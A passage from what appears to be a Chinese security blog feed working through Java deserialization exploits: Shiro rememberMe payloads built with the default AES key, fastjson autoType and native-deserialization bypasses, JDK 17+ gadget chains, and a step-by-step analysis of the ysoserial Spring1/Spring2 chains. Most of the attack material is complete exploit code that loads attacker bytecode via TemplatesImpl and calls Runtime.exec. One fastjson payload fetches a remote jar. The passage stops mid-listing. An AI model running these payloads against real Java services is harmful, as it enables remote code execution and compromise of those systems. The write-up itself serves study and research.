field.set(url,-1);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeObject(hashMap);        outputStream.flush();        return byteArrayOutputStream.toByteArray();    &#125;    public static void main(String[] args) throws Exception &#123;        byte[] payloads = getPayload();        AesCipherService aes = new AesCipherService();        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payloads, key);        System.out.printf(Base64.encodeToString(ciphertext.getBytes()));    &#125;&#125;

然后把生成的payload粘贴到cookie之中，特别要注意的是要把Cookie请求头中的sessionid删掉
这是因为你登陆了之后，那么服务端再次检测肯定是优先用你登陆后的session，而不是我们的rememberMe了，所以必须删掉后我们的payload才能够发挥作用

然后我们再去看burpsuite中的dns解析，如下：
EXPshiro下的cc链利用由于shiro下面集成了cb依赖，所以我们可以通过cb链来构造exp
package sherlock;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.Base64;import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.PriorityQueue;public class Payload &#123;    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception&#123;        Field field = object.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object, value);    &#125;    public static byte[] getPayload() throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        BeanComparator beanComparator = new BeanComparator();        beanComparator.setProperty(&quot;outputProperties&quot;);//        beanComparator.compare(templates,null);        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(beanComparator);        Class c1 = priorityQueue.getClass();        Field queueField = c1.getDeclaredField(&quot;queue&quot;);        queueField.setAccessible(true);        queueField.set(priorityQueue,new Object[]&#123;templates,templates,templates&#125;);        Field sizeField = c1.getDeclaredField(&quot;size&quot;);        sizeField.setAccessible(true);        sizeField.set(priorityQueue,3);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeObject(priorityQueue);        outputStream.flush();        return byteArrayOutputStream.toByteArray();    &#125;    public static void main(String[] args) throws Exception &#123;//        byte[] payloads = Payload.getPayload();//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payloads);//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);//        objectInputStream.readObject();        byte[] payloads = Payload.getPayload();        AesCipherService aes = new AesCipherService();        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payloads, key);        System.out.printf(Base64.encodeToString(ciphertext.getBytes()));    &#125;&#125;

先本地测试一下，可以弹出计算器，然后再生成加密后的payload，替换掉remenberMe中的内容，然后点击发送

成功弹出计算器
cc无依赖上面的CB链利用看上去只用到了commons beanutils，但是实际上当展开BeanComparator的import之后，会发现是引入了ComparableComparator的，而ComparableComparator是在cc中的。但是shiro只调用了cb中的一部分类，而没有调用BeanComparator，因此上面的链实际上是需要CC依赖的

当我们把pom.xml中的CC依赖注释掉之后，再重启项目并运行我们有CC依赖的exp后，会报错如下：
我们可以打个断点查一下BeanComparator类中哪里调用了ComparableComparator，可以发现是在该类的调用无参构造函数的时候，会一直走到第三个有两个参数的构造函数处，并且给参数comparator赋值为ComparableComparator

因此我们只需要通过反射修改一下comparator的值即可，但是修改后的comparator有几个必须满足的条件

实现了Serializable接口
实现了Comparator接口
在JDK中或者shiro依赖中或者CB中

最终找到一个CaseInsensitiveComparator类位于String中，虽然本身是私有的，但是它被String中的CASE_INSENSITIVE_ORDER给实例化了，CASE_INSENSITIVE_ORDER是一个CaseInsensitiveComparator对象
我们知道Beancomparator类中的两参构造函数是public的，所以我们可以直接调用该构造函数来把comparator值修改为CASE_INSENSITIVE_ORDER
payload：
package sherlock;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.Base64;import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.PriorityQueue;public class Payload &#123;    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception&#123;        Field field = object.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object, value);    &#125;    public static byte[] getPayload() throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);        beanComparator.setProperty(&quot;outputProperties&quot;);//        beanComparator.compare(templates,null);        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(beanComparator);        Class c1 = priorityQueue.getClass();        Field queueField = c1.getDeclaredField(&quot;queue&quot;);        queueField.setAccessible(true);        queueField.set(priorityQueue,new Object[]&#123;templates,templates,templates&#125;);        Field sizeField = c1.getDeclaredField(&quot;size&quot;);        sizeField.setAccessible(true);        sizeField.set(priorityQueue,3);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeObject(priorityQueue);        outputStream.flush();        return byteArrayOutputStream.toByteArray();    &#125;    public static void main(String[] args) throws Exception &#123;        byte[] payloads = Payload.getPayload();        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payloads);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);//        objectInputStream.readObject();//        byte[] payloads = Payload.getPayload();        AesCipherService aes = new AesCipherService();        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payloads, key);        System.out.printf(Base64.encodeToString(ciphertext.getBytes()));    &#125;&#125;

成功弹窗

]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化小总结</title>
    <url>/2025/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[CC链
CB链与shiro
fastjson1.2.24
&lt;&#x3D;1.2.47判断key值是否为@type之后做了一个checkAutoType的校验，被黑名单拦截
解决方法：向缓存类中添加一些我们的恶意类

&lt;&#x3D;1.2.68TypeUtils.loadClass()的地方加入了一个cache参数，默认为false，不能添加类
通过checkAutoType()校验的方式有哪些：

白名单里的类
开启了autotype
使用了JSONType注解
指定了期望类（expectClass）
缓存在mapping中的类
使用ParserConfig.AutoTypeCheckHandler接口通过校验的类

checkAutoType()中的expectClass参数类型为java.lang.Class，当expectClass传入checkAutoType()时不为null，并且我们要实例化的类是expectClass的子类或其实现时会将传入的类视为一个合法的类（不能在黑名单中），然后通过loadClass返回该类的class，我们就可以利用这个绕过checkAutoType()
EXP
package org.example;import com.alibaba.fastjson.JSON;public class AutoCloseableBypass &#123;    public static void main(String[] args) &#123;        JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.example.JavaBean\&quot;, \&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;&quot;);    &#125;&#125;

JavaBean
package org.example;import java.io.IOException;public class JavaBean implements AutoCloseable&#123;    public JavaBean(String cmd)&#123;        try&#123;            Runtime.getRuntime().exec(cmd);        &#125;catch (IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void close() throws Exception &#123;    &#125;&#125;

1.2.80在fastjson的1.2.80版本中可以通过将依赖加入到java.lang.Exception 期望类的子类中，绕过checkAutoType
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc &#123;    public static void main(String[] args) &#123;        String json =&quot;&#123;\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\n&quot; +                &quot;  \&quot;unit\&quot;:&#123;\n&quot; +                &quot;  &#125;\n&quot; +                &quot;&#125;&quot;;        try &#123;            JSON.parse(json);        &#125; catch (Exception e) &#123;        &#125;        json =                &quot;&#123;\n&quot; +                        &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.ProcessingUnit\&quot;,\n&quot; +                        &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\&quot;,\n&quot; +                        &quot;  \&quot;config\&quot;:&#123;\n&quot; +                        &quot;    \&quot;@type\&quot;: \&quot;org.codehaus.groovy.control.CompilerConfiguration\&quot;,\n&quot; +                        &quot;    \&quot;classpathList\&quot;:[\&quot;http://127.0.0.1:8433/attack-1.jar\&quot;]\n&quot; +                        &quot;  &#125;,\n&quot; +                        &quot;  \&quot;gcl\&quot;:null,\n&quot; +                        &quot;  \&quot;destDir\&quot;: \&quot;/tmp\&quot;\n&quot; +                        &quot;&#125;&quot;;        JSONObject.parse(json);    &#125;&#125;

原生反序列化fastjson&lt;&#x3D;1.2.48&amp;fastjson2fastjson2测至2.0.26

从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法
在其SecureObjectInputStream类当中重写了resolveClass,在其中调用了checkAutoType方法做类的检查
fastjson1在哪些情况下readObject的时候不会调用resolveClass，答案就是引用
如何在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查,答案是当向List、set、map类型中添加同样对象时即可成功利用
因此我们就可以利用这个思路构建攻击的payload了，这里简单以伪代码呈现，便于理解思路
TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;open -na Calculator&quot;);ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);JSONArray jsonArray = new JSONArray();jsonArray.add(templates);BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);arrayList.add(bd);  WriteObjects(arrayList);

简单梳理下
序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在handles这个hash表中查到了映射，后续则会以引用形式输出
反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray&#x2F;JSONObject对象，会触发JSONArray&#x2F;JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray&#x2F;JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过
import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Y4HackJSON &#123;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static byte[] genPayload(String cmd) throws Exception&#123;        ClassPool pool = ClassPool.getDefault();        CtClass clazz = pool.makeClass(&quot;a&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;&quot;+cmd+&quot;\&quot;);&quot;);        clazz.addConstructor(constructor);        clazz.getClassFile().setMajorVersion(49);        return clazz.toBytecode();    &#125;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;open -na Calculator&quot;)&#125;);        setValue(templates, &quot;_name&quot;, &quot;1&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&quot;val&quot;,jsonArray);        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(hashMap);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));        objectInputStream.readObject();    &#125;&#125;

高版本的一些绕过jdk&gt;&#x3D;17的时候发现BadAttributeValueExpException.readObject()无法作为source，因此就需要找其他的触发toString()的链拼起来
EventListenerList.readObject() -&gt; UndoManager#toString() -&gt;Vector#toString()
利用代码
Vector vector = new Vector();vector.add(jsonArray);UndoManager undoManager = new UndoManager();setField(undoManager,&quot;edits&quot;,vector);EventListenerList eventListenerList = new EventListenerList();setField(eventListenerList,&quot;listenerList&quot;,new Object[]&#123;Class.class,undoManager&#125;);unser(ser(eventListenerList));

HashMap#readObject()-&gt;putVal()-&gt;equals()-&gt;XString.equals()-&gt;toString()
自己写了个方法
public static HashMap getXString(Object obj) throws Exception&#123;    //obj传入待触发toString()的，可根据实际情况把XString换了，用来接任意equals    XString xstring=new XString(&quot;&quot;);    HashMap hashMap1 = new HashMap();    HashMap hashMap2 = new HashMap();    hashMap1.put(&quot;zZ&quot;,obj);    hashMap1.put(&quot;yy&quot;,xstring);    hashMap2.put(&quot;zZ&quot;,xstring);    hashMap2.put(&quot;yy&quot;,obj);    HashMap hashMap = new HashMap();    hashMap.put(&quot;hashMap1&quot;, 1);    hashMap.put(&quot;hashMap2&quot;, 2);    setHashMapKey(hashMap,&quot;hashMap1&quot;,hashMap1);//避免提前触发抛异常导致程序无法继续进行    setHashMapKey(hashMap,&quot;hashMap2&quot;,hashMap2);    return hashMap;&#125;

HashMap#readObject -&gt; HotSwappableTargetSource#equals -&gt; XString#equals -&gt; toString
    public static void main(String[] args) throws Exception &#123;        JSONArray jsonArray = new JSONArray();        jsonArray.add(getTemplates());        unser(ser(getHotSwappableTargetSource(jsonArray)));    &#125;public static HashMap getHotSwappableTargetSource(Object obj) throws Exception&#123;    HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(obj);    HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(&quot;x&quot;));    HashMap hashMap = new HashMap();    hashMap.put(&quot;1&quot;, hotSwappableTargetSource1);    hashMap.put(&quot;2&quot;, hotSwappableTargetSource2);    setHashMapKey(hashMap,&quot;1&quot;,hotSwappableTargetSource1);    setHashMapKey(hashMap,&quot;2&quot;,hotSwappableTargetSource2);    return hashMap;&#125;


高版本（&gt;2.0.26）绕过黑名单绕过
动态代理绕过

JdkDynamicAopProxy



AutowireUtils$ObjectFactoryDelegatingInvocationHandler


]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之yso中的spring链子分析</title>
    <url>/2025/04/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Byso%E4%B8%AD%E7%9A%84spring%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[
首发于先知社区，原文作者：Sherlock，原文链接：https://xz.aliyun.com/news/17923

前言最近开始学习spring链子，看网上分析spring链子的文章不多，讲的也比较简单，还都是yso中的spring1的链子分析，特此出一篇文章来详细分析spring1和spring2链子
Spring1spring版本范围在3.0.0到4.1.4
依赖
&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-core&lt;/artifactId&gt;        &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;        &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;

链子分析链子如下所示：
/*	Gadget chain:		ObjectInputStream.readObject()			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()				SerializableTypeWrapper.TypeProvider(Proxy).getType()					AnnotationInvocationHandler.invoke()						HashMap.get()				ReflectionUtils.findMethod()				SerializableTypeWrapper.TypeProvider(Proxy).getType()					AnnotationInvocationHandler.invoke()						HashMap.get()				ReflectionUtils.invokeMethod()					Method.invoke()						Templates(Proxy).newTransformer()							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()								ObjectFactory(Proxy).getObject()									AnnotationInvocationHandler.invoke()										HashMap.get()								Method.invoke()									TemplatesImpl.newTransformer()										TemplatesImpl.getTransletInstance()											TemplatesImpl.defineTransletClasses()												TemplatesImpl.TransletClassLoader.defineClass()													Pwner*(Javassist-generated).&lt;static init&gt;														Runtime.exec() */

该链子运用到了三层动态代理，因此要求我们对动态代理的原理和利用要有一个较为清晰的认识，关于动态代理的相关知识可详见一篇文章：https://cina666.github.io/2024/11/06/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/
好了接下来我们开始正式分析
首先我们先看入口，也就是SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()

这里主要就是通过反射完成方法调用，按照我们之前所学的肯定就要想到调用TemplatesImpl.newTransformer()来实现任意类加载从而可以执行任意命令
因此我们正常思路下我需要让this.provider.getType()返回TemplatesImpl对象，this.methodName为newTransformer()方法，mehodName可直接通过反射赋值
看眼getType()方法

返回的是this.result，而在构造函数里面result是transient，不可被序列化的，相当于这个方法对我们来说是无用的，这个时候我们就要用上动态代理了，当调用getType()方法的时候通过InvocationHandler的处理让其返回的是TemplatesImpl对象，而在学cc链的过程中我们有接触到这么一个类AnnotationInvocationHandler，它的invoke方法可以通过控制memberValues的属性来让其返回特定的对象
public Object invoke(Object proxy, Method method, Object[] args) &#123;    String member = method.getName();    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();    // Handle Object and Annotation methods    if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;        paramTypes[0] == Object.class)        return equalsImpl(args[0]);    if (paramTypes.length != 0)        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);    switch(member) &#123;    case &quot;toString&quot;:        return toStringImpl();    case &quot;hashCode&quot;:        return hashCodeImpl();    case &quot;annotationType&quot;:        return type;    &#125;    // Handle annotation member accessors    Object result = memberValues.get(member);    if (result == null)        throw new IncompleteAnnotationException(type, member);    if (result instanceof ExceptionProxy)        throw ((ExceptionProxy) result).generateException();    if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)        result = cloneArray(result);    return result;&#125;

究其原因在于 memberValues是一个Map&lt;String,Object&gt;类型的对象，我们可以设置键为getType，值为我们的TemplatesImpl对象便可以返回我们想要的，链子不应该就这么结束了吗
其实不然，回看getType()方法，它要求的是要返回一个Type类型的数据，而我们返回TemplatesImpl对象的话便会产生类型上的冲突，强转不了导致报错
所以我们通过getType()还要返回一个动态代理对象，其必须实现Type和Templates接口
那么要选择哪一个InvocationHandler，才能够让我们在调用该动态代理对象的newTransformer方法的时候调用到我们TemplatesImpl对象的newTransfoemer方法呢
注意一下，上面讲的调用该动态代理对象的newTransformer方法是在ReflectionUtils.invokeMethod()里调用的
public static Object invokeMethod(Method method, Object target) &#123;	return invokeMethod(method, target, new Object[0]);&#125;public static Object invokeMethod(Method method, Object target, Object... args) &#123;	try &#123;		return method.invoke(target, args);	&#125;	catch (Exception ex) &#123;		handleReflectionException(ex);	&#125;	throw new IllegalStateException(&quot;Should never get here&quot;);&#125;

yso的作者替我们找到了答案，即AutowireUtils.ObjectFactoryDelegatingInvocationHandler
看下它的invoke方法

重点关注return method.invoke(this.objectFactory.getObject(), args);，通过这个我们可以知道只要我们控制this.objectFactory.getObject()的返回值为我们的TemplatesImpl对象便可以了
又提到了控制，那么自然而然地就又想到了通过前面提到的动态代理，也就是让this.objectFactory为一个代理对象，其InvocationHandler自然就还是AnnotationInvocationHandler，但是这一次的memberValues的键就要换成getObject，值还是我们亲爱的TemplatesImpl对象
在这里我们便可以实现反射调用TemplatesImpl的newTransformer方法，从而实现任意类加载
调试综上所述，我们的poc如下
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.springframework.beans.factory.ObjectFactory;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        setField(templates, &quot;_name&quot;, &quot;aaa&quot;);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        setField(templates,&quot;_bytecodes&quot;, codes);        setField(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;getObject&quot;, templates);        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap);        ObjectFactory&lt;?&gt; objectFactory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;ObjectFactory.class&#125;, invocationHandler);        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);        Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructors()[0];        constructor2.setAccessible(true);        InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(objectFactory);        Type type = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Type.class, Templates.class&#125;, invocationHandler2);        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(&quot;getType&quot;, type);        InvocationHandler invocationHandler3 = (InvocationHandler) constructor.newInstance(Target.class, hashMap2);        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;typeProviderClass&#125;, invocationHandler3);        Class&lt;?&gt; class2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);        Constructor&lt;?&gt; constructor3 = class2.getDeclaredConstructors()[0];        constructor3.setAccessible(true);        Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);        setField(object, &quot;methodName&quot;, &quot;newTransformer&quot;);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(object);        byte[] serializedBytes = byteArrayOutputStream.toByteArray();        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);        System.out.println(base64Encoded);        byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded);        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes));        objectInputStream.readObject();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;&#125;

其中的Test.class文件的具体内容如下
package org.example;import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;

那ok，我们进行调试

跟进getType方法，按照动态代理的原理，就会直接跳到InvocationHandler中的invoke方法处，如下：

从merberValues中读到了getType的值，也就是同时实现Type和Templates接口的代理对象，后返回result
通过ReflectionUtils.findMethod方法成功获取到了我们想要的newTransformer方法

往下走，跟进invokeMethod方法（该行中的this.provider.getType()返回的依然是同时实现Type和Templates接口的代理对象）

再跟进invoke方法

便走到了AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()方法中，method是newTrnasFormer方法所以都不会走进if里面
继续往下走

根据poc我们可以知道该处的this.objectFactory是一个代理对象，调用getObject()方法便会走到其InvocationHandler的invoke方法中
跟进

我们可以看到返回的result便是我们心心念念的TemplatesImpl对象
往下走，返回后，return method.invoke(this.objectFactory.getObject(), args);代码其实就是return method.invoke(templates, args);
成功调用TemplatesImpl的newTransformer方法，实现任意类加载

弹出计算器

Spring2依赖
&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-core&lt;/artifactId&gt;        &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;        &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;        &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;

链子分析链子如下：
/** * Gadget chain: * TemplatesImpl.newTransformer() * Method.invoke(Object, Object...) * AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[]) * JdkDynamicAopProxy.invoke(Object, Method, Object[]) * $Proxy0.newTransformer() * Method.invoke(Object, Object...) * SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream) * * @author mbechler */

该条链子与Spring1的前半条链子是一样的，入口都是SerializableTypeWrapper$MethodInvokeTypeProvider.readObject
这条链子主要是为了说明ObjectFactoryDelegatingInvocationHandler并不是关键所在，即使它被禁了我们依然有其他的方法可以成功实现任意类加载
这里所用的关键InvocationHandler除了AnnotationInvocationHandler之外就是JdkDynamicAopProxy
我们进该类的invoke方法看一手
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;		MethodInvocation invocation;		Object oldProxy = null;		boolean setProxyContext = false;		TargetSource targetSource = this.advised.targetSource;		Class&lt;?&gt; targetClass = null;		Object target = null;		try &#123;			if (!this.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;				// The target does not implement the equals(Object) method itself.				return equals(args[0]);			&#125;			if (!this.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;				// The target does not implement the hashCode() method itself.				return hashCode();			&#125;			if (!this.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp;					method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;				// Service invocations on ProxyConfig with the proxy config...				return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);			&#125;			Object retVal;			if (this.advised.exposeProxy) &#123;				// Make invocation available if necessary.				oldProxy = AopContext.setCurrentProxy(proxy);				setProxyContext = true;			&#125;			// May be null. Get as late as possible to minimize the time we 